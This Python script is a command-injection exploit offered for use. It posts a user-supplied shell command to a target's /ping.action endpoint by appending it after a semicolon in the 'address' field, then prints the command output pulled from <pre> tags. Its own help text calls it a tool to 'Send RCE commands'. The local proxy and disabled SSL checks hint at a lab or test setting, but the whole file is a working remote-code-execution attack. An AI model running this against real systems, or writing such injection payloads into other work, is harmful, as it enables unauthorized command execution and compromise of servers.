import requests
import re
import argparse

def send_request(host, port, command):
    # Initialize a session
    session = requests.Session()
    session.verify = False  # Disable SSL verification for troubleshooting

    # Proxy configuration
    session.proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    # Target URL
    url = f"http://{host}:{port}/ping.action"

    # Headers
    session.headers.update({
        "Host": f"{host}:{port}",
        "Cache-Control": "max-age=0",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"http://{host}:{port}/ping.action",
        "Cookie": "JSESSIONID=1m43ngk7m4xjm1ivy1s2jtgn13",
        "Connection": "keep-alive",
    })

    # POST data with the user-supplied command
    data = {
        "address": f"localhost 2> /dev/null; {command}"
    }

    # Send the request
    response = session.post(url, data=data)

    # Check if request was successful
    if response.status_code == 200:
        # Extract content inside <pre> tag
        match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)
        if match:
            extracted_data = match.group(1).strip()
            print("Extracted Data:\n", extracted_data)
        else:
            print("No <pre> tag found in response.")
    else:
        print(f"Request failed with status code: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send RCE commands via HTTP request.")
    parser.add_argument("--host", required=True, help="Target host (e.g., localhost)")
    parser.add_argument("--port", required=True, type=int, help="Target port (e.g., 9000)")
    parser.add_argument("--command", required=True, help="Command to execute (e.g., 'ls -lah')")

    args = parser.parse_args()
    send_request(args.host, args.port, args.command)